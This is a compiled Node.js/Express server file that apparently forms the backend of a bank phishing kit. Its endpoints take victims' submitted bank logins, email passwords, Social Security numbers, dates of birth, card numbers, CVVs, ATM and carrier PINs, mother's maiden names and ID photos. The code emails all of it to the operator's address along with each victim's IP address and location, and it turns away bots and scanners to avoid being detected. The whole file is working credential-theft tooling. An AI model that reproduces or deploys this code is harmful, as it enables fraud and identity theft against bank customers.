"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const express_nobots_1 = __importDefault(require("express-nobots"));
const geoip_lite_1 = __importDefault(require("geoip-lite"));
const mobile_detect_1 = __importDefault(require("mobile-detect"));
const express_formidable_1 = __importDefault(require("express-formidable"));
require("dotenv").config();
const sendEmail_1 = require("./utils/sendEmail");
const path_1 = __importDefault(require("path"));
const app = express_1.default();
app.use(express_formidable_1.default());
const port = process.env.PORT || 5000;
app.use(express_nobots_1.default());
app.use(express_1.default.json());
app.post("/send-files", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    var _a, _b, _c;
    const md = new mobile_detect_1.default(req.headers["user-agent"]);
    const isBot = md.is("Bot");
    if (isBot) {
        res.send("Fuck off");
        return;
    }
    const front = (_a = req.files) === null || _a === void 0 ? void 0 : _a.front;
    const back = (_b = req.files) === null || _b === void 0 ? void 0 : _b.back;
    try {
        const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
        const geo = geoip_lite_1.default.lookup(ip);
        yield sendEmail_1.sendEmail(process.env.TO, `
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <h4>SUPPORTING DOCUMENTS</h4>
     <p>| (▰˘◡˘▰) See attached files</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
     <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.city}, ${geo === null || geo === void 0 ? void 0 : geo.country}</b></p>
     <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
     <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     `, `${process.env.BANK_NAME} - ${(_c = req.fields) === null || _c === void 0 ? void 0 : _c.form} by ROCKET 🚀🚀🚀 From ${ip}`, [
            {
                filename: `Front.${front.name.split(".")[1]}`,
                content: front,
            },
            {
                filename: `Back.${front.name.split(".")[1]}`,
                content: back,
            },
        ]);
        res.send(Promise.resolve());
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong");
    }
}));
app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const md = new mobile_detect_1.default(req.headers["user-agent"]);
    const isBot = md.is("Bot");
    if (isBot) {
        res.send("Fuck off");
        return;
    }
    try {
        const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
        const geo = geoip_lite_1.default.lookup(ip);
        const values = JSON.parse(Object.keys(req.fields)[0]);
        yield sendEmail_1.sendEmail(process.env.TO, `
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     ${values.form === "LOGIN DETAILS"
            ? `
        <br>
        <h4>LOGIN DETAILS</h4>
        <p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${values.loginDetails.loginAttempt}</b></p>
        <p>| (▰˘◡˘▰) USERNAME ☞ <b>${values.loginDetails.username}</b></p>
        <p>| (▰˘◡˘▰) PASSWORD ☞ <b>${values.loginDetails.password}</b></p>
        <br>
        `
            : ` ${values.form === "EMAIL LOGINS"
                ? `
         <br>
         <h4>EMAIL LOGINS</h4>
         <p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${values.emailLogins.email}</b></p>
         <p>| (▰˘◡˘▰) EMAIL ADDRESS PASSWORD ☞ <b>${values.emailLogins.emailPassword}</b></p>
         `
                : `
     ${values.form === "BILLING"
                    ? `
     <br>
     <h4>BILLING</h4>
     <p>| (▰˘◡˘▰) FIRST NAME ☞ <b>${values.informations.firstname}</b></p>
     <p>| (▰˘◡˘▰) LAST NAME ☞ <b>${values.informations.lastname}</b></p>
     <p>| (▰˘◡˘▰) SSN ☞ <b>${values.informations.ssn}</b></p>
     <p>| (▰˘◡˘▰) DOB ☞ <b>${values.informations.dob}</b></p>
     <p>| (▰˘◡˘▰) STREET ADDRESS ☞ <b>${values.informations.streetAddress}</b></p>
     <p>| (▰˘◡˘▰) SUITE/APT/OTHER ☞ <b>${values.informations.suite}</b></p>
     <p>| (▰˘◡˘▰) ZIP CODE ☞ <b>${values.informations.zipCode}</b></p>
     <p>| (▰˘◡˘▰) STATE ☞ <b>${values.informations.state}</b></p>
     <p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${values.informations.phoneNumber}</b></p>
     <p>| (▰˘◡˘▰) CARRIER PIN ☞ <b>${values.informations.carrierPin}</b></p>
     <br>
     `
                    : ` <br>
         <h4>CARD DETAILS</h4>
         <p>| (▰˘◡˘▰) CARD NUMBER ☞ <b>${values.cardInformation.cardNumber}</b></p>
         <p>| (▰˘◡˘▰) EXPIRATION DATE ☞ <b>${values.cardInformation.expirationDate}</b></B></p>
         <p>| (▰˘◡˘▰) CVV ☞ <b>${values.cardInformation.securityCode}</b></p>
         <p>| (▰˘◡˘▰) MOTHER'S MAIDEN NAME ☞ <b>${values.cardInformation.mothersMaidenName}</b></p>
         <p>| (▰˘◡˘▰) CARD PIN ☞ <b>${values.cardInformation.atmPin}</b></p>
         <br>`}`}
     `}
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
     <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.city}, ${geo === null || geo === void 0 ? void 0 : geo.country}</b></p>
     <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
     <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     `, `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`);
        res.send(Promise.resolve());
    }
    catch (error) {
        res.status(500).send("Something went wrong");
    }
}));
app.use(express_1.default.static(path_1.default.join(__dirname, "../build")));
app.get("/-", (req, res) => {
    const md = new mobile_detect_1.default(req.headers["user-agent"]);
    const isBot = md.is("Bot");
    if (isBot) {
        res.send("Fuck off");
        return;
    }
    res.sendFile(path_1.default.join(__dirname, "../build", "index.html"));
});
app.listen(port, () => {
    console.log(`Listening on http://localhost:${port}`);
});
//# sourceMappingURL=index.js.map